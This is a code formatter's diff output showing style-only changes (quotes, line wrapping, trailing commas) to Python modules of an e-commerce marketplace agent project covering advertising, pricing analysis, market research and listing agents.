+            battery_optimizer,
+            config,
         )
 
         self.ebay_client = None  # Will be initialized in setup
-        self.ai_service = None   # Will be initialized in setup
+        self.ai_service = None  # Will be initialized in setup
         self.request_semaphore = asyncio.Semaphore(2)
         self.campaign_cache = {}
         self.cache_duration = timedelta(hours=1)
 
     def _get_required_config_fields(self) -> list[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "ebay_app_id",
-            "ebay_dev_id",
-            "ebay_cert_id",
-            "ebay_token",
-            "ai_service_url",
-            "campaign_budget_limit",
-            "optimization_interval"
-        ])
+        fields.extend(
+            [
+                "ebay_app_id",
+                "ebay_dev_id",
+                "ebay_cert_id",
+                "ebay_token",
+                "ai_service_url",
+                "campaign_budget_limit",
+                "optimization_interval",
+            ]
+        )
         return fields
 
     async def _setup_marketplace_client(self) -> None:
         """Set up the eBay client and AI service."""
         # Initialize eBay client with credentials from config
         # This would be implemented with actual eBay API client
         self.ebay_client = None  # Placeholder for eBay client
-        self.ai_service = None   # Placeholder for AI service
+        self.ai_service = None  # Placeholder for AI service
 
     async def create_ad_campaign(self, campaign_data: Dict[str, Any]) -> Dict[str, Any]:
         """
         Create a new ad campaign using eBay's Advertising API.
 
@@ -314,19 +338,23 @@
         except Exception as e:
             logger.error("Error applying optimizations: %s", e)
             raise
 
     # Placeholder methods for actual implementation
-    async def _mock_ebay_call(self, method: str, data: Dict[str, Any]) -> Dict[str, Any]:
+    async def _mock_ebay_call(
+        self, method: str, data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Mock eBay API call for testing"""
         return {"success": True, "campaignId": f"campaign_{uuid4()}"}
 
     async def _optimize_campaign_strategy(self, **kwargs) -> Dict[str, Any]:
         """Mock campaign strategy optimization"""
         return {"daily_budget": 50.0, "bidding_strategy": {"type": "auto"}}
 
-    async def _setup_bid_optimization(self, campaign_id: str, strategy: Dict[str, Any]) -> None:
+    async def _setup_bid_optimization(
+        self, campaign_id: str, strategy: Dict[str, Any]
+    ) -> None:
         """Mock bid optimization setup"""
         pass
 
     async def _get_campaign_data(self, campaign_id: str) -> Dict[str, Any]:
         """Mock campaign data retrieval"""
@@ -336,21 +364,28 @@
         """Mock campaign optimization"""
         return {"bid_adjustments": {}, "budget_adjustment": 0, "targeting_updates": {}}
 
     def _process_performance_data(self, response: Dict[str, Any]) -> Dict[str, Any]:
         """Mock performance data processing"""
-        return {"roas": 2.5, "cost_per_click": 0.3, "impression_share": 0.15, "conversion_rate": 0.02}
+        return {
+            "roas": 2.5,
+            "cost_per_click": 0.3,
+            "impression_share": 0.15,
+            "conversion_rate": 0.02,
+        }
 
     async def _update_bids(self, campaign_id: str, adjustments: Dict[str, Any]) -> None:
         """Mock bid updates"""
         pass
 
     async def _update_budget(self, campaign_id: str, adjustment: float) -> None:
         """Mock budget updates"""
         pass
 
-    async def _update_targeting(self, campaign_id: str, updates: Dict[str, Any]) -> None:
+    async def _update_targeting(
+        self, campaign_id: str, updates: Dict[str, Any]
+    ) -> None:
         """Mock targeting updates"""
         pass
 
     def get_status(self) -> Dict[str, Any]:
         """
@@ -358,10 +393,10 @@
 
         Returns:
             Agent status information
         """
         return {
-            "agent_id": getattr(self, 'agent_id', 'advertising_agent'),
+            "agent_id": getattr(self, "agent_id", "advertising_agent"),
             "agent_type": "AdvertisingAgent",
             "status": "operational",
             "last_activity": datetime.now().isoformat(),
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/advertising_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/market_agent.py	2025-06-16 23:39:58.672706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/market_agent.py	2025-06-19 04:03:41.724659+00:00
@@ -11,413 +11,483 @@
 import re
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 from decimal import Decimal
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 from fs_agt_clean.agents.market.amazon_client import AmazonClient
 from fs_agt_clean.agents.market.ebay_client import eBayClient
 from fs_agt_clean.agents.market.pricing_engine import PricingEngine, PricingStrategy
 from fs_agt_clean.core.models.marketplace_models import (
-    ProductIdentifier, Price, PricingRecommendation, CompetitorAnalysis,
-    InventoryStatus, ListingOptimization, DemandForecast, MarketMetrics,
-    MarketplaceType, create_product_identifier, create_price
+    ProductIdentifier,
+    Price,
+    PricingRecommendation,
+    CompetitorAnalysis,
+    InventoryStatus,
+    ListingOptimization,
+    DemandForecast,
+    MarketMetrics,
+    MarketplaceType,
+    create_product_identifier,
+    create_price,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class MarketAgent(BaseConversationalAgent):
     """Market Intelligence Agent for pricing and marketplace optimization."""
-    
+
     def __init__(self, agent_id: Optional[str] = None, use_fast_model: bool = True):
         """Initialize the Market Agent."""
         super().__init__(AgentRole.MARKET, agent_id, use_fast_model)
-        
+
         # Initialize marketplace clients
         self.amazon_client = None
         self.ebay_client = None
-        
+
         # Initialize pricing engine
         self.pricing_engine = PricingEngine()
-        
+
         # Cache for recent analyses
         self.analysis_cache = {}
         self.cache_ttl = 300  # 5 minutes
-        
+
         logger.info(f"Market Agent initialized: {self.agent_id}")
-    
+
     async def _process_response(
         self,
         llm_response: str,
         original_message: str,
         conversation_id: str,
-        context: Optional[Dict[str, Any]]
+        context: Optional[Dict[str, Any]],
     ) -> str:
         """Process LLM response with market-specific enhancements."""
         try:
             # Extract any product identifiers from the original message
             product_info = self._extract_product_info(original_message)
-            
+
             # Determine the type of market query
             query_type = self._classify_market_query(original_message)
-            
+
             # Enhance response with market data if relevant
             enhanced_response = await self._enhance_with_market_data(
                 llm_response, query_type, product_info, conversation_id
             )
-            
+
             return enhanced_response
-            
+
         except Exception as e:
             logger.error(f"Error processing market agent response: {e}")
             return llm_response  # Return original response if enhancement fails
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get market-specific context for prompt generation."""
         return {
             "business_type": "e-commerce marketplace seller",
             "marketplaces": "Amazon, eBay, Walmart",
             "categories": "electronics, home goods, consumer products",
             "metrics": "pricing, inventory, sales rank, competition",
-            "specializations": "pricing analysis, inventory management, competitor monitoring, marketplace optimization, demand forecasting"
+            "specializations": "pricing analysis, inventory management, competitor monitoring, marketplace optimization, demand forecasting",
         }
-    
+
     def _extract_product_info(self, message: str) -> Dict[str, Any]:
         """Extract product identifiers and information from user message."""
         product_info = {}
-        
+
         # Extract ASIN (Amazon Standard Identification Number)
-        asin_pattern = r'\b[A-Z0-9]{10}\b'
+        asin_pattern = r"\b[A-Z0-9]{10}\b"
         asin_matches = re.findall(asin_pattern, message)
         if asin_matches:
             product_info["asin"] = asin_matches[0]
-        
+
         # Extract SKU patterns
-        sku_pattern = r'\bSKU[:\-\s]*([A-Z0-9\-]+)\b'
+        sku_pattern = r"\bSKU[:\-\s]*([A-Z0-9\-]+)\b"
         sku_matches = re.findall(sku_pattern, message, re.IGNORECASE)
         if sku_matches:
             product_info["sku"] = sku_matches[0]
-        
+
         # Extract UPC/EAN patterns
-        upc_pattern = r'\b\d{12,13}\b'
+        upc_pattern = r"\b\d{12,13}\b"
         upc_matches = re.findall(upc_pattern, message)
         if upc_matches:
             product_info["upc"] = upc_matches[0]
-        
+
         # Extract price mentions
-        price_pattern = r'\$(\d+(?:\.\d{2})?)'
+        price_pattern = r"\$(\d+(?:\.\d{2})?)"
         price_matches = re.findall(price_pattern, message)
         if price_matches:
             product_info["mentioned_price"] = float(price_matches[0])
-        
+
         # Extract product titles/names (simple heuristic)
         # Look for quoted strings or capitalized phrases
         title_pattern = r'"([^"]+)"'
         title_matches = re.findall(title_pattern, message)
         if title_matches:
             product_info["product_title"] = title_matches[0]
-        
+
         return product_info
-    
+
     def _classify_market_query(self, message: str) -> str:
         """Classify the type of market query."""
         message_lower = message.lower()
-        
+
         # Pricing queries
-        pricing_keywords = ["price", "pricing", "cost", "expensive", "cheap", "competitive"]
+        pricing_keywords = [
+            "price",
+            "pricing",
+            "cost",
+            "expensive",
+            "cheap",
+            "competitive",
+        ]
         if any(keyword in message_lower for keyword in pricing_keywords):
             return "pricing"
-        
+
         # Inventory queries
-        inventory_keywords = ["inventory", "stock", "quantity", "available", "out of stock"]
+        inventory_keywords = [
+            "inventory",
+            "stock",
+            "quantity",
+            "available",
+            "out of stock",
+        ]
         if any(keyword in message_lower for keyword in inventory_keywords):
             return "inventory"
-        
+
         # Competitor queries
         competitor_keywords = ["competitor", "competition", "compare", "vs", "versus"]
         if any(keyword in message_lower for keyword in competitor_keywords):
             return "competitor"
-        
+
         # Optimization queries
-        optimization_keywords = ["optimize", "improve", "better", "increase sales", "ranking"]
+        optimization_keywords = [
+            "optimize",
+            "improve",
+            "better",
+            "increase sales",
+            "ranking",
+        ]
         if any(keyword in message_lower for keyword in optimization_keywords):
             return "optimization"
-        
+
         # Forecasting queries
         forecast_keywords = ["forecast", "predict", "demand", "trend", "future"]
         if any(keyword in message_lower for keyword in forecast_keywords):
             return "forecast"
-        
+
         return "general"
-    
+
     async def _enhance_with_market_data(
         self,
         llm_response: str,
         query_type: str,
         product_info: Dict[str, Any],
-        conversation_id: str
+        conversation_id: str,
     ) -> str:
         """Enhance LLM response with actual market data."""
         try:
             # Initialize clients if needed
             await self._ensure_clients_initialized()
-            
+
             enhanced_parts = [llm_response]
-            
+
             if query_type == "pricing" and product_info:
                 pricing_data = await self._get_pricing_analysis(product_info)
                 if pricing_data:
-                    enhanced_parts.append(f"\n\n **Pricing Analysis:**\n{pricing_data}")
-            
+                    enhanced_parts.append(
+                        f"\n\n **Pricing Analysis:**\n{pricing_data}"
+                    )
+
             elif query_type == "inventory" and product_info:
                 inventory_data = await self._get_inventory_analysis(product_info)
                 if inventory_data:
-                    enhanced_parts.append(f"\n\n **Inventory Status:**\n{inventory_data}")
-            
+                    enhanced_parts.append(
+                        f"\n\n **Inventory Status:**\n{inventory_data}"
+                    )
+
             elif query_type == "competitor" and product_info:
                 competitor_data = await self._get_competitor_analysis(product_info)
                 if competitor_data:
-                    enhanced_parts.append(f"\n\n **Competitor Analysis:**\n{competitor_data}")
-            
+                    enhanced_parts.append(
+                        f"\n\n **Competitor Analysis:**\n{competitor_data}"
+                    )
+
             elif query_type == "optimization" and product_info:
-                optimization_data = await self._get_optimization_suggestions(product_info)
+                optimization_data = await self._get_optimization_suggestions(
+                    product_info
+                )
                 if optimization_data:
-                    enhanced_parts.append(f"\n\n **Optimization Suggestions:**\n{optimization_data}")
-            
+                    enhanced_parts.append(
+                        f"\n\n **Optimization Suggestions:**\n{optimization_data}"
+                    )
+
             elif query_type == "forecast" and product_info:
                 forecast_data = await self._get_demand_forecast(product_info)
                 if forecast_data:
-                    enhanced_parts.append(f"\n\n **Demand Forecast:**\n{forecast_data}")
-            
+                    enhanced_parts.append(
+                        f"\n\n **Demand Forecast:**\n{forecast_data}"
+                    )
+
             return "\n".join(enhanced_parts)
-            
+
         except Exception as e:
             logger.error(f"Error enhancing response with market data: {e}")
             return llm_response
-    
+
     async def _ensure_clients_initialized(self):
         """Ensure marketplace clients are initialized."""
         if self.amazon_client is None:
             self.amazon_client = AmazonClient()
-        
+
         if self.ebay_client is None:
             self.ebay_client = eBayClient()
-    
-    async def _get_pricing_analysis(self, product_info: Dict[str, Any]) -> Optional[str]:
+
+    async def _get_pricing_analysis(
+        self, product_info: Dict[str, Any]
+    ) -> Optional[str]:
         """Get pricing analysis for a product."""
         try:
             # Create product identifier
             product_id = create_product_identifier(
                 asin=product_info.get("asin"),
                 sku=product_info.get("sku"),
-                upc=product_info.get("upc")
-            )
-            
+                upc=product_info.get("upc"),
+            )
+
             # Get current price (mock for now)
             current_price = create_price(
                 product_info.get("mentioned_price", 29.99),
-                marketplace=MarketplaceType.AMAZON
-            )
-            
+                marketplace=MarketplaceType.AMAZON,
+            )
+
             # Get competitor prices
             competitor_prices = []
-            
+
             # Amazon competitive pricing
             async with self.amazon_client:
                 if product_info.get("asin"):
-                    amazon_prices = await self.amazon_client.get_competitive_pricing(product_info["asin"])
+                    amazon_prices = await self.amazon_client.get_competitive_pricing(
+                        product_info["asin"]
+                    )
                     competitor_prices.extend(amazon_prices)
-            
+
             # eBay competitive pricing
             async with self.ebay_client:
                 if product_info.get("product_title"):
-                    ebay_prices = await self.ebay_client.get_competitive_prices(product_info["product_title"])
+                    ebay_prices = await self.ebay_client.get_competitive_prices(
+                        product_info["product_title"]
+                    )
                     competitor_prices.extend(ebay_prices[:5])  # Limit to top 5
-            
+
             # Perform pricing analysis
             recommendation = await self.pricing_engine.analyze_pricing(
                 product_id=product_id,
                 current_price=current_price,
-                competitor_prices=competitor_prices
-            )
-            
+                competitor_prices=competitor_prices,
+            )
+
             # Format the analysis
             return self._format_pricing_analysis(recommendation)
-            
+
         except Exception as e:
             logger.error(f"Error in pricing analysis: {e}")
             return None
-    
-    async def _get_inventory_analysis(self, product_info: Dict[str, Any]) -> Optional[str]:
+
+    async def _get_inventory_analysis(
+        self, product_info: Dict[str, Any]
+    ) -> Optional[str]:
         """Get inventory analysis for a product."""
         try:
             if not product_info.get("sku"):
                 return "Please provide a SKU for inventory analysis."
-            
+
             async with self.amazon_client:
-                inventory_status = await self.amazon_client.get_inventory_status(product_info["sku"])
-            
+                inventory_status = await self.amazon_client.get_inventory_status(
+                    product_info["sku"]
+                )
+
             if inventory_status:
                 return self._format_inventory_analysis(inventory_status)
-            
+
             return "Unable to retrieve inventory information at this time."
-            
+
         except Exception as e:
             logger.error(f"Error in inventory analysis: {e}")
             return None
-    
-    async def _get_competitor_analysis(self, product_info: Dict[str, Any]) -> Optional[str]:
+
+    async def _get_competitor_analysis(
+        self, product_info: Dict[str, Any]
+    ) -> Optional[str]:
         """Get competitor analysis for a product."""
         try:
             # This would perform comprehensive competitor analysis
             # For now, return a summary based on available data
-            
+
             analysis_parts = []
-            
+
             # Amazon competitors
             if product_info.get("asin"):
                 async with self.amazon_client:
-                    amazon_listing = await self.amazon_client.get_product_details(product_info["asin"])
+                    amazon_listing = await self.amazon_client.get_product_details(
+                        product_info["asin"]
+                    )
                     if amazon_listing:
-                        analysis_parts.append(f"Amazon: {amazon_listing.title} - ${amazon_listing.current_price.amount}")
-            
+                        analysis_parts.append(
+                            f"Amazon: {amazon_listing.title} - ${amazon_listing.current_price.amount}"
+                        )
+
             # eBay competitors
             if product_info.get("product_title"):
                 async with self.ebay_client:
-                    ebay_listings = await self.ebay_client.search_products(product_info["product_title"], limit=3)
+                    ebay_listings = await self.ebay_client.search_products(
+                        product_info["product_title"], limit=3
+                    )
                     for listing in ebay_listings:
-                        analysis_parts.append(f"eBay: {listing.title[:50]}... - ${listing.current_price.amount}")
-            
+                        analysis_parts.append(
+                            f"eBay: {listing.title[:50]}... - ${listing.current_price.amount}"
+                        )
+
             if analysis_parts:
                 return "\n".join(analysis_parts)
-            
+
             return "No competitor data available for this product."
-            
+
         except Exception as e:
             logger.error(f"Error in competitor analysis: {e}")
             return None
-    
-    async def _get_optimization_suggestions(self, product_info: Dict[str, Any]) -> Optional[str]:
+
+    async def _get_optimization_suggestions(
+        self, product_info: Dict[str, Any]
+    ) -> Optional[str]:
         """Get optimization suggestions for a product."""
         try:
             suggestions = []
-            
+
             # Price optimization
             if product_info.get("mentioned_price"):
                 suggestions.append("Consider competitive pricing analysis")
-            
+
             # Title optimization
             if product_info.get("product_title"):
                 suggestions.append("Optimize product title with relevant keywords")
-            
+
             # General suggestions
-            suggestions.extend([
-                "Improve product images quality",
-                "Enhance product description with benefits",
-                "Monitor competitor pricing regularly",
-                "Track inventory levels to avoid stockouts"
-            ])
-            
+            suggestions.extend(
+                [
+                    "Improve product images quality",
+                    "Enhance product description with benefits",
+                    "Monitor competitor pricing regularly",
+                    "Track inventory levels to avoid stockouts",
+                ]
+            )
+
             return "\n".join(f" {suggestion}" for suggestion in suggestions)
-            
+
         except Exception as e:
             logger.error(f"Error generating optimization suggestions: {e}")
             return None
-    
+
     async def _get_demand_forecast(self, product_info: Dict[str, Any]) -> Optional[str]:
         """Get demand forecast for a product."""
         try:
             # This would use historical data and ML models
             # For now, provide a basic forecast
-            
+
             forecast_parts = [
                 "Based on current market trends:",
                 " Expected demand: Moderate to High",
                 " Seasonal factors: Consider holiday season impact",
-                " Recommendation: Maintain adequate inventory levels"
+                " Recommendation: Maintain adequate inventory levels",
             ]
-            
+
             return "\n".join(forecast_parts)
-            
+
         except Exception as e:
             logger.error(f"Error generating demand forecast: {e}")
             return None
-    
+
     def _format_pricing_analysis(self, recommendation: PricingRecommendation) -> str:
         """Format pricing recommendation for display."""
         current = recommendation.current_price.amount
         recommended = recommendation.recommended_price.amount
         change_percent = float((recommended - current) / current * 100)
-        
+
         parts = [
             f"Current Price: ${current}",
             f"Recommended Price: ${recommended}",
             f"Change: {change_percent:+.1f}%",
             f"Confidence: {recommendation.confidence_score:.1%}",
-            f"Reasoning: {recommendation.reasoning}"
+            f"Reasoning: {recommendation.reasoning}",
         ]
-        
+
         return "\n".join(parts)
-    
+
     def _format_inventory_analysis(self, inventory: InventoryStatus) -> str:
         """Format inventory status for display."""
         parts = [
             f"Available: {inventory.quantity_available} units",
             f"Reserved: {inventory.quantity_reserved} units",
-            f"Inbound: {inventory.quantity_inbound} units"
+            f"Inbound: {inventory.quantity_inbound} units",
         ]
-        
+
         if inventory.reorder_point:
             parts.append(f"Reorder Point: {inventory.reorder_point} units")
-        
+
         if inventory.fulfillment_method:
             parts.append(f"Fulfillment: {inventory.fulfillment_method}")
-        
+
         return "\n".join(parts)
-    
+
     # Public API methods for direct agent calls
-    
+
     async def analyze_pricing(self, product_id: str) -> PricingRecommendation:
         """Analyze pricing for a product."""
         # This would be called directly by other systems
         pass
-    
+
     async def check_inventory(self, sku: str) -> InventoryStatus:
         """Check inventory status for a SKU."""
         # This would be called directly by other systems
         pass
-    
+
     async def monitor_competitors(self, product_id: str) -> CompetitorAnalysis:
         """Monitor competitors for a product."""
         # This would be called directly by other systems
         pass
-    
+
     async def optimize_listing(self, listing_id: str) -> ListingOptimization:
         """Optimize a product listing."""
         # This would be called directly by other systems
         pass
-    
+
     async def forecast_demand(self, product_id: str) -> DemandForecast:
         """Forecast demand for a product."""
         # This would be called directly by other systems
         pass
 
     # Phase 2D: Methods required by orchestration workflows
 
-    async def analyze_pricing_strategy(self, product_data: Dict[str, Any], user_message: str) -> Dict[str, Any]:
+    async def analyze_pricing_strategy(
+        self, product_data: Dict[str, Any], user_message: str
+    ) -> Dict[str, Any]:
         """Analyze pricing strategy for a product based on user request."""
         try:
-            logger.info(f"Market Agent analyzing pricing strategy for: {user_message[:50]}...")
+            logger.info(
+                f"Market Agent analyzing pricing strategy for: {user_message[:50]}..."
+            )
 
             # Extract product information from user message and product data
             product_info = {
                 "product_name": product_data.get("name", "electronics product"),
                 "category": product_data.get("category", "electronics"),
                 "current_price": product_data.get("price", 0),
-                "user_query": user_message
+                "user_query": user_message,
             }
 
             # Generate AI-powered pricing analysis
             analysis_prompt = f"""
             Analyze the pricing strategy for this product request:
@@ -438,26 +508,30 @@
             """
 
             # Get AI analysis
             response = await self.llm_client.generate_response(
                 prompt=analysis_prompt,
-                system_prompt="You are an expert market analyst specializing in e-commerce pricing strategies."
+                system_prompt="You are an expert market analyst specializing in e-commerce pricing strategies.",
             )
 
             # Structure the analysis
             pricing_analysis = {
                 "analysis_type": "pricing_strategy",
                 "product_info": product_info,
                 "ai_insights": response.content,
                 "confidence_score": response.confidence_score,
-                "recommendations": self._extract_pricing_recommendations(response.content),
+                "recommendations": self._extract_pricing_recommendations(
+                    response.content
+                ),
                 "market_position": self._determine_market_position(product_info),
                 "competitive_factors": self._analyze_competitive_factors(product_info),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
-            logger.info(f"Market Agent completed pricing strategy analysis with confidence: {response.confidence_score}")
+            logger.info(
+                f"Market Agent completed pricing strategy analysis with confidence: {response.confidence_score}"
+            )
             return pricing_analysis
 
         except Exception as e:
             logger.error(f"Error in pricing strategy analysis: {e}")
             return {
@@ -466,18 +540,22 @@
                 "error_message": str(e),
                 "fallback_recommendations": [
                     "Research competitor pricing in your category",
                     "Consider cost-plus pricing as a baseline",
                     "Test different price points with A/B testing",
-                    "Monitor market response and adjust accordingly"
-                ]
+                    "Monitor market response and adjust accordingly",
+                ],
             }
 
-    async def conduct_market_research(self, research_topic: str, research_scope: str = "general") -> Dict[str, Any]:
+    async def conduct_market_research(
+        self, research_topic: str, research_scope: str = "general"
+    ) -> Dict[str, Any]:
         """Conduct comprehensive market research on a topic."""
         try:
-            logger.info(f"Market Agent conducting research on: {research_topic[:50]}...")
+            logger.info(
+                f"Market Agent conducting research on: {research_topic[:50]}..."
+            )
 
             # Generate research analysis
             research_prompt = f"""
             Conduct comprehensive market research on this topic:
 
@@ -497,11 +575,11 @@
             """
 
             # Get AI research analysis
             response = await self.llm_client.generate_response(
                 prompt=research_prompt,
-                system_prompt="You are an expert market researcher with deep knowledge of e-commerce markets and consumer behavior."
+                system_prompt="You are an expert market researcher with deep knowledge of e-commerce markets and consumer behavior.",
             )
 
             # Structure the research
             market_research = {
                 "research_type": "market_analysis",
@@ -511,14 +589,16 @@
                 "confidence_score": response.confidence_score,
                 "key_findings": self._extract_key_findings(response.content),
                 "market_trends": self._identify_market_trends(response.content),
                 "opportunities": self._extract_opportunities(response.content),
                 "threats": self._extract_threats(response.content),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
-            logger.info(f"Market Agent completed market research with confidence: {response.confidence_score}")
+            logger.info(
+                f"Market Agent completed market research with confidence: {response.confidence_score}"
+            )
             return market_research
 
         except Exception as e:
             logger.error(f"Error in market research: {e}")
             return {
@@ -527,33 +607,35 @@
                 "error_message": str(e),
                 "fallback_insights": [
                     "Research your target market demographics",
                     "Analyze competitor strategies and positioning",
                     "Monitor industry trends and news",
-                    "Survey potential customers for insights"
-                ]
+                    "Survey potential customers for insights",
+                ],
             }
 
     def _extract_pricing_recommendations(self, ai_content: str) -> List[str]:
         """Extract pricing recommendations from AI analysis."""
         recommendations = []
 
         # Look for numbered lists or bullet points
-        lines = ai_content.split('\n')
+        lines = ai_content.split("\n")
         for line in lines:
             line = line.strip()
-            if (line.startswith(('1.', '2.', '3.', '4.', '5.', '-', '')) and
-                any(keyword in line.lower() for keyword in ['price', 'cost', 'margin', 'competitive'])):
+            if line.startswith(("1.", "2.", "3.", "4.", "5.", "-", "")) and any(
+                keyword in line.lower()
+                for keyword in ["price", "cost", "margin", "competitive"]
+            ):
                 recommendations.append(line)
 
         # Fallback recommendations if none found
         if not recommendations:
             recommendations = [
                 "Analyze competitor pricing in your category",
                 "Consider value-based pricing strategies",
                 "Test price elasticity with small adjustments",
-                "Monitor profit margins and adjust accordingly"
+                "Monitor profit margins and adjust accordingly",
             ]
 
         return recommendations[:5]  # Limit to top 5
 
     def _determine_market_position(self, product_info: Dict[str, Any]) -> str:
@@ -576,77 +658,92 @@
         factors = []
 
         category = product_info.get("category", "").lower()
 
         if "electronics" in category:
-            factors.extend([
-                "Technology lifecycle and obsolescence",
-                "Brand recognition and reputation",
-                "Feature differentiation",
-                "Warranty and support services"
-            ])
-
-        factors.extend([
-            "Market demand and seasonality",
-            "Competitor pricing strategies",
-            "Distribution channel costs",
-            "Customer price sensitivity"
-        ])
+            factors.extend(
+                [
+                    "Technology lifecycle and obsolescence",
+                    "Brand recognition and reputation",
+                    "Feature differentiation",
+                    "Warranty and support services",
+                ]
+            )
+
+        factors.extend(
+            [
+                "Market demand and seasonality",
+                "Competitor pricing strategies",
+                "Distribution channel costs",
+                "Customer price sensitivity",
+            ]
+        )
 
         return factors
 
     def _extract_key_findings(self, ai_content: str) -> List[str]:
         """Extract key findings from market research."""
         findings = []
 
         # Look for key insights in the content
-        lines = ai_content.split('\n')
+        lines = ai_content.split("\n")
         for line in lines:
             line = line.strip()
-            if (line.startswith(('Key', 'Important', 'Notable', 'Significant')) or
-                any(keyword in line.lower() for keyword in ['trend', 'growth', 'market', 'consumer'])):
+            if line.startswith(("Key", "Important", "Notable", "Significant")) or any(
+                keyword in line.lower()
+                for keyword in ["trend", "growth", "market", "consumer"]
+            ):
                 if len(line) > 20:  # Avoid short lines
                     findings.append(line)
 
         return findings[:5]  # Limit to top 5
 
     def _identify_market_trends(self, ai_content: str) -> List[str]:
         """Identify market trends from research content."""
         trends = []
 
         # Look for trend-related content
-        lines = ai_content.split('\n')
+        lines = ai_content.split("\n")
         for line in lines:
             line = line.strip()
-            if any(keyword in line.lower() for keyword in ['trend', 'growing', 'increasing', 'emerging', 'rising']):
+            if any(
+                keyword in line.lower()
+                for keyword in ["trend", "growing", "increasing", "emerging", "rising"]
+            ):
                 if len(line) > 15:
                     trends.append(line)
 
         return trends[:5]  # Limit to top 5
 
     def _extract_opportunities(self, ai_content: str) -> List[str]:
         """Extract market opportunities from research."""
         opportunities = []
 
         # Look for opportunity-related content
-        lines = ai_content.split('\n')
+        lines = ai_content.split("\n")
         for line in lines:
             line = line.strip()
-            if any(keyword in line.lower() for keyword in ['opportunity', 'potential', 'gap', 'untapped', 'growth']):
+            if any(
+                keyword in line.lower()
+                for keyword in ["opportunity", "potential", "gap", "untapped", "growth"]
+            ):
                 if len(line) > 15:
                     opportunities.append(line)
 
         return opportunities[:5]  # Limit to top 5
 
     def _extract_threats(self, ai_content: str) -> List[str]:
         """Extract market threats from research."""
         threats = []
 
         # Look for threat-related content
-        lines = ai_content.split('\n')
+        lines = ai_content.split("\n")
         for line in lines:
             line = line.strip()
-            if any(keyword in line.lower() for keyword in ['threat', 'risk', 'challenge', 'competition', 'decline']):
+            if any(
+                keyword in line.lower()
+                for keyword in ["threat", "risk", "challenge", "competition", "decline"]
+            ):
                 if len(line) > 15:
                     threats.append(line)
 
         return threats[:5]  # Limit to top 5
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/market_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_market_analyzer.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_market_analyzer.py	2025-06-19 04:03:41.754286+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for market_analyzer
 
 This module contains agent-focused tests for the migrated market_analyzer component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from market_analyzer import *
+
 
 class TestMarketAnalyzerAgent:
     """Agent test class for market_analyzer."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/test_market_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/market_analyzer.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/market_analyzer.py	2025-06-19 04:03:41.799181+00:00
@@ -2,11 +2,14 @@
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Set, Tuple, cast
 
 import numpy as np
 
-from fs_agt_clean.agents.market.specialized.market_types import CompetitorProfile, MarketData
+from fs_agt_clean.agents.market.specialized.market_types import (
+    CompetitorProfile,
+    MarketData,
+)
 from fs_agt_clean.core.models.vector_store.store import VectorStore
 from fs_agt_clean.core.monitoring.alerts.manager import AlertManager
 from fs_agt_clean.services.marketplace.amazon.service import AmazonService
 from fs_agt_clean.services.marketplace.ebay.service import EbayService
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/market_analyzer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/listing_agent.py	2025-06-14 20:35:30.767688+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/market/specialized/listing_agent.py	2025-06-19 04:03:41.857111+00:00
@@ -49,40 +49,47 @@
             alert_manager = AlertManager()
         if battery_optimizer is None:
             battery_optimizer = BatteryOptimizer()
 
         super().__init__(
-            agent_id, marketplace, config_manager, alert_manager, battery_optimizer, config
+            agent_id,
+            marketplace,
+            config_manager,
+            alert_manager,
+            battery_optimizer,
+            config,
         )
 
-        self.ai_service = None   # Will be initialized in setup
+        self.ai_service = None  # Will be initialized in setup
         self.ebay_client = None  # Will be initialized in setup
         self.request_semaphore = asyncio.Semaphore(2)
         self.max_retries = 3
         self.retry_delay = 1
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "ebay_app_id",
-            "ebay_dev_id",
-            "ebay_cert_id",
-            "ebay_token",
-            "ai_service_url",
-            "paypal_email",
-            "default_policies",
-            "image_validation_enabled"
-        ])
+        fields.extend(
+            [
+                "ebay_app_id",
+                "ebay_dev_id",
+                "ebay_cert_id",
+                "ebay_token",
+                "ai_service_url",
+                "paypal_email",
+                "default_policies",
+                "image_validation_enabled",
+            ]
+        )
         return fields
 
     async def _setup_marketplace_client(self) -> None:
         """Set up the eBay client and AI service."""
